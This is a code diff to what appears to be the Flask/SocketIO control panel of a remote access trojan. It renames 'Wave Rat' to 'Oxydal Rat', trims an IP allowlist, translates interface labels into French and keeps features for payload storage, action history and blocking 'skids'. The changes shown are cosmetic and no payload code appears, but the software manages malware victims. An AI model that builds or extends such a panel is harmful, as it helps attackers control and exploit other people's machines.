@@ -13,7 +13,7 @@ app.config["SECRET_KEY"] = "super_secret_key_change_me_123456789"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
 # ===================== CONFIG =====================
-ALLOWED_IPS = {"37.66.149.36", "91.170.86.224", "80.215.131.115"}  # ← Change avec tes IPs
+ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}  # ← Change avec tes IPs
 HISTORY_FILE = "history_log.json"
 PAYLOADS_FILE = "payloads.json"
 BLOCKED_IPS_FILE = "blocked_ips.json"  # Nouveau : stockage des skids
@@ -131,7 +131,7 @@ HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
 <meta charset="UTF-8">
-<title>Wave Rat Dashboard</title>
+<title>Oxydal Rat — Wave Theme</title>
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
 <style>
@@ -194,7 +194,7 @@ HTML = """<!DOCTYPE html>
 <div class="header">
     <div class="logo">
         <svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
-        <div>Wave Rat</div>
+        <div>Oxydal Rat</div>
     </div>
     <div class="stats">Players online: <b id="stats">0</b></div>
 </div>
@@ -214,9 +214,9 @@ HTML = """<!DOCTYPE html>
             <div id="payloads-list"></div>
         </div>
         <div id="history-tab" class="tab" style="display:none;">
-            <h2 style="color:var(--primary);text-align:center;margin-bottom:1.5rem;">History</h2>
+            <h2 style="color:var(--primary);text-align:center;margin-bottom:1.5rem;">Historique des actions</h2>
             <div id="history" style="margin-bottom:3rem;"></div>
-            <h2 class="skid-title">Skid detected (<span id="skid-count">0</span>)</h2>
+            <h2 class="skid-title">Skid détectés (<span id="skid-count">0</span>)</h2>
             <div id="skid-list" style="max-height:60vh;overflow-y:auto;"></div>
         </div>
     </div>
@@ -457,7 +457,7 @@ function renderSkids(data) {
     const list = document.getElementById("skid-list");
     const count = document.getElementById("skid-count");
     if (!data.blocked || data.blocked.length === 0) {
-        list.innerHTML = `<p style="text-align:center;color:#94a3b8;padding:2rem;">Aucun skid détecté</p>`;
+        list.innerHTML = `<p style="text-align:center;color:#94a3b8;padding:2rem;">Aucun skid détecté • GG aux vrais</p>`;
         count.textContent = "0";
         return;
     }
@@ -616,4 +616,3 @@ def broadcast_loop():
 if __name__ == "__main__":
     socketio.start_background_task(broadcast_loop)
     socketio.run(app, host="0.0.0.0", port=5000)
-
